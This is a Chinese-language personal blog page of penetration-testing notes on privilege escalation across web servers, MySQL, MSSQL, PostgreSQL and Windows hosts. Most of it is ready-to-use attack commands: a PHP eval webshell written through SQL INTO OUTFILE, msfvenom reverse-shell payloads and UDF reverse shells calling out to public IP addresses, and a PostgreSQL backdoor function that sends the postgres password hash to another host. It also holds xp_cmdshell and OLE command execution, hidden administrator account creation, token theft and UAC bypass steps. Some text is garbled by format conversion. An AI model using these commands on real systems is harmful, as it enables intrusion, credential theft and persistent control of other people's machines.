



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://n1h1l157.github.io/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">



  <title>
 |
Phut Hon = X_T = 天行健，君子以自强不息</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2023-07-04 01:48:20">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2023-07-04T01:48:20+08:00">2023-07-04</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>8.1k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>13 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/wM1vF7Eipkbmzlg.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/paNiQwcqzXCExYj.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/X8mSzsruevjtc9f.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/X1rsLTk5JUecDzf.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/OpkYA94CeUZvRI5.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/S4bepoyLPicVCx5.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content=".N1h1l157">
    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="X_T">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h3 id="91-webshell提权"><a class="markdownIt-Anchor" href="#91-webshell提权">#</a> 9.1 webshell 提权</h3>
<h4 id="911-phpmyadmin突破"><a class="markdownIt-Anchor" href="#911-phpmyadmin突破">#</a> 9.1.1 phpmyadmin 突破</h4>
<p>phpadmin 通过后台写 sql 拿 webshell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">显示当前目录: show variables like &#x27;%datadir%&#x27;;或 select @@basedir;</span><br><span class="line">查看数据库当前操作用户拥有写权限:show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">写入后门: select &#x27;&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;&#x27; INTO OUTFILE &#x27;/var/lib/mysql/a.php&#x27;</span><br><span class="line">开启慢日志记录：set global slow_query_log=1;</span><br><span class="line">设置日志存储目录：set global slow_query_log_file=&#x27;/var/lib/www/blog.1.php&#x27;;</span><br><span class="line">写入木马记录在日志：select &#x27;&lt;?php eval($_GET[A])?&gt;&#x27; or SLEEP(1);</span><br></pre></td></tr></table></figure>
<ul>
<li>secure_file_priv 参数：NULL 不允许导入或导出、/tmp 只允许在 /tmp 目录导入导出、空则<br>
不限制目录</li>
<li>root 高权限读文件：UNION SELECT 1,load_file (‘d:/w.txt’),3</li>
<li>root 高权限写文件：UNION SELECT 1,‘xxxx’,3 into outfile ‘d:/www.txt’</li>
</ul>
<h4 id="912-win-web提权至系统"><a class="markdownIt-Anchor" href="#912-win-web提权至系统">#</a> 9.1.2 win web 提权至系统</h4>
<h5 id="1-信息收集"><a class="markdownIt-Anchor" href="#1-信息收集">#</a> （ 1 ）信息收集</h5>
<h5 id="操作系统版本-漏洞补丁-系统位数-杀软防护-网络情况-当前权限等"><a class="markdownIt-Anchor" href="#操作系统版本-漏洞补丁-系统位数-杀软防护-网络情况-当前权限等">#</a> 操作系统版本、漏洞补丁、系统位数、杀软防护、网络情况、当前权限等</h5>
<p>信息。如 ver、systeminfo、whoami、netstat - ano、tasklist /svc 等。<br>
如果提权中无法执行命令，需要通过 web 权限上传 cmd.exej 进行执行，基<br>
于补丁和系统版本位数来进行筛选可用溢出漏洞 EXP、手工操作、基于 CS 的<br>
半自动化提权、基于 MSF 的全自动化提权。</p>
<p>（ 2 ）手工查找 CVE 与 EXP</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bG1vbi9WdWxtYXA=">https://github.com/vulmon/Vulmap</span> (不建议)<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JpdHNhZG1pbi93ZXNuZw==">https://github.com/bitsadmin/wesng</span> (systeminfo&gt; 1.txt, 之后用 wesng 去解析，<br>
效果一般)<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nocm9ibGVydC9XaW5kb3dzVnVsblNjYW4=">https://github.com/chroblert/WindowsVulnScan</span> (.\KBCollect.ps1 生成 KB.json<br>
 再去解析)<br>
<span class="exturl" data-url="aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=">https://i.hacking8.com/tiquan</span> (将 systeminfo 的信息输入到此页面查找漏洞)</p>
<h5 id="3-工具辅助提权"><a class="markdownIt-Anchor" href="#3-工具辅助提权">#</a> （ 3 ）工具辅助提权</h5>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FzY290YmUvS2VybmVsSHVi">https://github.com/Ascotbe/KernelHub</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vbWktc2VjL1BvQy1pbi1HaXRIdWI=">https://github.com/nomi-sec/PoC-in-GitHub</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2s4Z2VnZS9MYWRvbg==">https://github.com/k8gege/Ladon</span><br>
 工具提权不一定能成功，因为受作者测试环境与真实环境的不同，脚本难<br>
以完全一致，通常会选取 msf/cs 的自动化提权，毕竟经过了时间的考究。</p>
<h4 id="913-msf全自动提权"><a class="markdownIt-Anchor" href="#913-msf全自动提权">#</a> 9.1.3 MSF 全自动提权</h4>
<h5 id="1-生成反弹后门"><a class="markdownIt-Anchor" href="#1-生成反弹后门">#</a> （ 1 ）生成反弹后门</h5>
<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.102<br>
LPORT=3333 -f exe -o msf.exe<br>
msfvenom - a x86 --platform windows - p windows/meterpreter/reverse<br>
_tcp LHOST=192.168.0.102 LPORT=4444 - b “\x00” - i 10 - f exe - o ~/Desktop/t.exe</p>
<p>（ 2 ）配置监听会话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>（ 3 ）筛选 EXP 模块</p>
<p>background<br>
use post/windows/gather/enum_patches（半自动：根据漏洞编号找出系统中<br>
安装的补丁）<br>
use post/multi/recon/local_exploit_suggester（全自动：快速识别系统中可能<br>
被利用的漏洞）<br>
set session 1<br>
set showdescription true</p>
<p>（ 4 ）特别注意</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果没有显示出来漏洞利用脚本，需要更新msf即使用msfupdate命令</span><br><span class="line">利用EXP溢出提权，注意需要重新监听会话并指定端口</span><br><span class="line">background</span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set localhot. set local port</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<h4 id="914-cs半自动化提权"><a class="markdownIt-Anchor" href="#914-cs半自动化提权">#</a> 9.1.4 cs 半自动化提权</h4>
<h5 id="1-配置启动"><a class="markdownIt-Anchor" href="#1-配置启动">#</a> （ 1 ）配置启动</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器启动服务端：chmod +x teamserver &amp; ./teamserver IP password</span><br><span class="line">客户端连接服务端：运行cobaltstrike.bat（运行不起来请检测JDK版本）</span><br></pre></td></tr></table></figure>
<p>（ 2 ）配置监听器生成后执行</p>
<p>（ 3 ）选择提权模块调用执行，默认的脚本不够好，需要用加载的如 taowu、</p>
<p>lodon 脚本</p>
<p>| centos install java</p>
<p>（ 1 ）建议获取 jdk 的地址：<span class="exturl" data-url="aHR0cHM6Ly9qZGsuamF2YS5uZXQ=">https://jdk.java.net</span></p>
<p>（ 2 ）需要打开 oracle 官网，寻找适合操作系统处理器的版本</p>
<p>sudo wget <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5vcmFjbGUuY29tL2phdmEvMTkvbGF0ZXN0L2pkay0xOV9saW51eC0=">https://download.oracle.com/java/19/latest/jdk-19_linux-</span><br>
x64_bin.tar.gz - O /etc/opt/jdk19.tar.gz</p>
<p>（ 3 ）让 centos 知道该链接</p>
<p>update-alternatives --install /usr/bin/java java<br>
sudo update-alternatives --install /usr/bin/java java /etc/opt/jdk-19.0.1/bin/java<br>
100</p>
<p>（ 4 ）更新 /etc/alternatives/java 链接，选择当前要使用的 jdk 序号</p>
<p>sudo update-alternatives --config java<br>
 注：sudo yum install java- 17 - openjdk 网络问题会失败，通过 java - version 检<br>
查是否安装成功</p>
<p>| linux 检验端口是否开放正常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">与远程公网ip建立连接看是否能连上：</span><br><span class="line">远程公网执行：nc -l -p 4444 -v</span><br><span class="line">本地内网执行：nc 1.117.52.xx 4444</span><br><span class="line">注意 iptablses、firewalld、安全组都会有影响，如果嫌麻烦的话，需要将前</span><br></pre></td></tr></table></figure>
<h5 id="两者都关掉第三者的端口统统开放"><a class="markdownIt-Anchor" href="#两者都关掉第三者的端口统统开放">#</a> 两者都关掉，第三者的端口统统开放</h5>
<h3 id="92-数据库提权"><a class="markdownIt-Anchor" href="#92-数据库提权">#</a> 9.2 数据库提权</h3>
<h4 id="921-mysql提权"><a class="markdownIt-Anchor" href="#921-mysql提权">#</a> 9.2.1 mysql 提权</h4>
<h5 id="用系统漏洞提权要比数据库漏洞提权更容易得到权限"><a class="markdownIt-Anchor" href="#用系统漏洞提权要比数据库漏洞提权更容易得到权限">#</a> 用系统漏洞提权要比数据库漏洞提权更容易得到权限。</h5>
<p>一般采用 UDF 提权和启动项的方式，都需要拿到此时的数据库的 root 权限，<br>
并且两者都是需要往特殊目录下写入文件，并且需要 - secure-file-priv 没进行目<br>
录限制，如果做了目录限制是无法提权到系统权限的</p>
<p>（ 1 ）mysql UDF 提权</p>
<p>mysql&lt;5.2 导出目录 c:/windows 或 system32；<br>
mysql=&gt;5.2 导出安装目录 /lib/plugin/<br>
select version () 查看当前的数据库版本；select @@basedir 查看当前的目录<br>
 GRANT ALL PRIVILEGES ON <em>.</em> TO ‘帐号’@’%’ IDENTIFIED BY ‘密码’<br>
WITH GRANT OPTION; 允许所有账户的外连</p>
<p>使用 MSF 中的 exploit/multi/mysql/mysql_udf_payload 模块可以进行 UDF 提<br>
权，MSF 会将 dll 文件写入 lib\plugin\ 目录下 (如果没有 /lib/plugin/ 这个目录，需要<br>
手动创建这个文件夹), 该 dll 文件中包含 sys_exec () 和 sys_eval () 两个函数，但是<br>
默认只创建 sys_exec () 函数，该函数执行并不会有回显。我们可以手动创建<br>
 sys_eval () 函数，来执行有回显的命令。</p>
<p>MSF:（前提先开外连）<br>
use exploit/multi/mysql/mysql_udf_payload<br>
set payload windows/meterpreter/reverse_tcp<br>
set password root<br>
set rhosts 47.102.195.100<br>
run<br>
 当 msf 将 dll 文件写入 /lib/plugin 下，可使用 Navicat 调用系统命令：<br>
select * from mysql.func where name = “sys_exec”; // 查看<br>
 create function sys_eval returns string soname “WqkerHcA.dll”;// 创建函数绑定<br>
 dll<br>
select sys_eval (“whoami”);// 调用函数进行命令执行</p>
<p>（ 2 ）mysql 启动项提权</p>
<p>写一些启动项到 windows 上，windows 启动后会启动这类 bat 或者 exe，可<br>
以在 bat 中加 calc pause 进行测试。<br>
MSF：（前提先开外连）<br>
use exploit/windows/mysql/mysql_start_up<br>
set rhosts 47.102.195.100<br>
set username root<br>
set password root<br>
run</p>
<p>（ 3 ）mysql 通过 udf 反弹 shell</p>
<p>原理同 udf 提权，再 plugin 下写入 dll 文件，用 sys_exec 调用 dll 执行系统<br>
命令，从而反弹 shell，需要提前监听 shell 端口（如果 linux 的话就是 so 文件）。<br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzgwMTcxOC9hcnRpY2xlL2RldGFpbHMvMTA1NDkzMDQy">https://blog.csdn.net/weixin_43801718/article/details/105493042</span><br>
use mysql;<br>
set @a=concat(’’,<br>
create table Ghost(data LONGBLOB);<br>
insert into Ghost values(&quot;&quot;);update Ghost set data = @a;<br>
select data from Ghost into DUMPFILE ‘C:\phpstudy\PHPTutorial\MySQL<br>
\lib\plugin\udf.dll’;<br>
create function backshell returns string soname ‘udf.dll’;<br>
select backshell(‘47.94.236.117’,7788)</p>
<p>（ 4 ）MOF 提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOF-Win2008后权限控制导致无效（不好用）</span><br><span class="line">https://www.cnblogs.com/xishaonian/p/6384535.html</span><br><span class="line">MSF：use exploit/windows/mysql/mysql_mof</span><br></pre></td></tr></table></figure>
<h4 id="922-mssql提权"><a class="markdownIt-Anchor" href="#922-mssql提权">#</a> 9.2.2 mssql 提权</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSSQL提权（windows安装的，在linux上没有）：</span><br></pre></td></tr></table></figure>
<p>（ 1 ）xp_cmdshell 提权</p>
<p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则<br>
默认禁止。如果用户拥有管理员 sa 权限则可以用 sp_configure 重新开启它。</p>
<h5 id="启用"><a class="markdownIt-Anchor" href="#启用">#</a> 启用：</h5>
<p>EXEC sp_configure ‘show advanced options’, 1<br>
RECONFIGURE;<br>
EXEC sp_configure ‘xp_cmdshell’, 1;<br>
RECONFIGURE;<br>
 关闭：<br>
exec sp_configure ‘show advanced options’, 1;<br>
reconfigure;<br>
exec sp_configure ‘xp_cmdshell’, 0;<br>
reconfigure;<br>
 执行：<br>
EXEC master.dbo.xp_cmdshell ‘命令’<br>
如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复<br>
 exec master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft<br>
SQL Server\MSSQL\Binn\xplog70.dll’</p>
<p>（ 2 ）sp_oacreate 提权</p>
<p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。<br>
启用：<br>
EXEC sp_configure ‘show advanced options’, 1;<br>
RECONFIGURE WITH OVERRIDE;<br>
EXEC sp_configure ‘Ole Automation Procedures’, 1;<br>
RECONFIGURE WITH OVERRIDE;<br>
 关闭：<br>
EXEC sp_configure ‘show advanced options’, 1;<br>
RECONFIGURE WITH OVERRIDE;<br>
EXEC sp_configure ‘Ole Automation Procedures’, 0;<br>
RECONFIGURE WITH OVERRIDE;<br>
 执行：<br>
declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec<br>
sp_oamethod @shell,‘run’,null,‘c:\windows\system32\cmd.exe /c whoami &gt;c:\1.txt’</p>
<p>（ 3 ）沙盒提权</p>
<p>不开启的话在执行 xp_regwrite 会提示让我们开启：<br>
exec sp_configure ‘show advanced options’,1;reconfigure;</p>
<p>exec sp_configure ‘Ad Hoc Distributed Queries’,1;reconfigure;<br>
 关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码：<br>
exec master…xp_regwrite<br>
‘HKEY_LOCAL_MACHINE’,‘SOFTWARE\Microsoft\Jet\4.0\Engines’,‘SandBoxMo<br>
de’,‘REG_DWORD’,0;<br>
 查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影<br>
响我们执行下面的语句：<br>
exec master.dbo.xp_regread<br>
‘HKEY_LOCAL_MACHINE’,‘SOFTWARE\Microsoft\Jet\4.0\Engines’,<br>
‘SandBoxMode’<br>
执行系统命令 select * from<br>
openrowset(‘microsoft.jet.oledb.4.0’,’;database=c:/windows/system32/ias/ias.mdb’,‘sel<br>
ect shell(“net user margin margin /add”)’)<br>
select * from<br>
openrowset(‘microsoft.jet.oledb.4.0’,’;database=c:/windows/system32/ias/ias.mdb’,‘sel<br>
ect shell(“net localgroup administrators margin /add”)’)</p>
<p>沙盒模式 SandBoxMode 参数含义（默认是 2 ）<br>
 <code>0</code> ：在任何所有者中禁止启用安全模式<br>
 <code>1</code>  ：为仅在允许范围内<br>
 <code>2</code>  ：必须在 access 模式下<br>
 <code>3</code> ：完全开启</p>
<p>openrowset 是可以通过 OLE DB 访问 SQL Server 数据库，OLE DB 是应用<br>
程序链接到 SQL Server 的的驱动程序。恢复配置如下：<br>
–exec master…xp_regwrite<br>
‘HKEY_LOCAL_MACHINE’,‘SOFTWARE\Microsoft\Jet\4.0\Engines’,‘SandBoxMo<br>
de’,‘REG_DWORD’,1;<br>
–exec sp_configure ‘Ad Hoc Distributed Queries’,0;reconfigure;<br>
–exec sp_configure ‘show advanced options’,0;reconfigure;</p>
<h4 id="923-oracle提权"><a class="markdownIt-Anchor" href="#923-oracle提权">#</a> 9.2.3 oracle 提权</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工具地址：https://github.com/jas502n/oracleshell</span><br></pre></td></tr></table></figure>
<p>（ 1 ）普通用户模式：</p>
<p>前提是拥有一个普通的 oracle 连接账号，不需要 DBA 权限，可提权至<br>
 DBA，并以 oracle 实例运行的权限执行操作系统命令。</p>
<p>（ 2 ）DBA 用户模式：（自动化工具）</p>
<p>拥有 DBA 账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键<br>
执行测试。</p>
<p>（ 3 ）注入提升模式：</p>
<p>拥有一个 oracle 注入点，可以通过注入点直接执行系统命令，此种模式没<br>
有实现回显。</p>
<h4 id="924-postgresql提权"><a class="markdownIt-Anchor" href="#924-postgresql提权">#</a> 9.2.4 postgresql 提权</h4>
<p>PostgreSQL 是一款关系型数据库。其 9.3 到 10 版本中存在一个逻辑错误，<br>
导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些<br>
不可预期的操作。</p>
<p>（ 1 ）PostgreSQL 提权漏洞（CVE- 2018 - 1058 ）</p>
<p>普通用户植入后门命令：<br>
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT<br>
AS $$<br>
select dblink_connect((select ‘hostaddr=10.0.0.1 port=5433 user=postgres<br>
password=chybeta sslmode=disable dbname=’||(SELECT passwd FROM pg_shadow<br>
WHERE usename=‘postgres’)));<br>
SELECT pg_catalog.array_to_string($1,$2);</p>
 LANGUAGE SQL VOLATILE;
管理员操作数据库触发：
docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub

（ 2 ）PostgreSQL 高权限命令执行漏洞（CVE- 2019 - 9193 ）

在连接到的后门一般是哥斯拉中利用数据库操作中执行以下命令，其中id
表示需要执行的系统命令
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;


#### 9.2.5 三方应用提权

通过cs的插件，如果此时已经通过webshell运行了cs木马，可以通过下
列插件来获取明文凭据，收集更多的内网信息，但是这不一定能收集成功，毕
竟有防火墙需要规避
远控类：Teamviewer 向日葵 Todesk VNC Radmin 等
密码类：各大浏览器 Xshell Navicat 3389 等

### 9.3 win本地用户提权

#### 9.3.1 win2003 at与sc命令

（ 1 ）at命令提权

at 命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用
system权限。适用版本：Win2000 & Win2003 & XP中还是存在的，在Win7以
后被剔除。当我们拿到低权限的用户，通过连接上服务器后，可以通过at命令
来进行本地提权。
at 21:00 /interactive cmd (在20:33分生成一个交互式的System权限的cmd)

（ 2 ）sc命令提权

sc 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类
似于控制面板中管理工具项中的服务。
创建一个名叫syscmd的新的交互式的cmd执行服务
sc Create syscmd binPath= "cmd /K start" type= own type= interact
运行服务sc start syscmd

#### 9.3.2 winserver psexec提权

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">适用版本：Win2012 and Win2008 &amp; Win2016 基本可以</span><br><span class="line">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br><span class="line">psexec.exe -accepteula -s -i -d cmd</span><br></pre></td></tr></table></figure>
#### 9.3.3进程迁移注入

（ 1 ）<win 2008 进程注入 ##### 相当于开了一个后门，注入到其他用户进程下 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pinjector -l</span><br><span class="line">pinjector -p 420 cmd 3333</span><br><span class="line">nc 192.168.46.149 3333</span><br></pre></td></tr></table>
（ 2 ）Win2008&2012&2016 MSF进程注入

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps //查看进程</span><br><span class="line">migrate PID //迁移对应PID</span><br></pre></td></tr></table></figure>
#### 9.3.4 win2012用户权限与令牌窃取

##### 假冒令牌可以假冒一个网络中的另一个用户进行各类操作。当一个攻击者

##### 需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。

msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117
LPORT=3333 -f exe -o msf.exe
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

（ 1 ）Win2008 2012 2016 Web权限烂土豆配合令牌窃取

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute -cH -f ./potato.exe //配合烂土豆</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
（ 2 ）Win7 msf自动化提权

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getuid //查看当前权限</span><br><span class="line">getsystem // 提权</span><br></pre></td></tr></table></figure>
#### 9.3.5 win7 10 bypassUAC提权

为了远程执行目标的 exe 或者 bat可执行文件绕过此安全机制，以此叫
BypassUAC，开启UAC和未开启UAC时,MSF默认getsystem提权影响(进程注
入)。
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.46.158 lport=3333

- f exe -o msf.exe


（ 1 ）MSF模块BypassUAC

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Win7本地权限：use exploit/windows/local/bypassua</span><br><span class="line">Win10本地权限</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure>
（ 2 ）UACME项目（推荐）

项目地址：https://github.com/hfiref0x/UACME
Akagi64.exe 41 msf1.exe
Akagi64.exe 编号 调用执行
通过此程序调用exe文件，调用时用的SYSTEM权限，则此时反弹得到的
shell是可以提权到STSTEM权限的。

#### 9.3.6 win2012 Dll劫持配合msf

Windows程序启动的时候需要 DLL。如果这些DLL 不存在，则可以通过
在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其
预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：应用程序加载的
目录、C:\Windows\System32、C:\Windows\System、C:\Windows、当前工作目录
Current Working Directory，CWD、在PATH环境变量的目录（先系统后用户）
利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用，制作dll并上
传，替换dll，启动应用后成功。还可以用ChkDllHijack来检测与某程序相关联
的DLL 文件，提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖
DLL实现利用。
msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=4444 -
f dll -o xiaodi.dll

#### 9.3.7 win2012 服务路径及权限

##### （ 1 ）不带引号服务路径配合MSF

##### 利用 JAWS 或者命令检测服务路径，需要服务没有双引号并且服务中出现

了空格，那么就可以看作是前边的路径是程序后边的路径是参数，上传 exe木
马到此路径下，并用命令行启动服务上传反弹exe，设置好对应执行名后，执行
sc start "Macro Expert"，木马上线。


JAWS下载地址：https://github.com/411Hall/JAWS
检测命令：wmic service get name,displayname,pathname,startmode |findstr /i
"Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

（ 2 ）不安全的服务权限配合MSF-NewServices

即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用
户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。
有的目录是不允许被修改的。
利用accesschk或 PowerUp(PowerSploit)检测服务权限配置，制作文件并上
传，创建新服务并更改服务路径指向，启动服务时木马被执行。
PowerSploit 下载地址：https://github.com/PowerShellMafia/PowerSploit
accesschk 下载地址：https://docs.microsoft.com/en-
us/sysinternals/downloads/accesschk
accesschk.exe -uwcqv "administrators" *
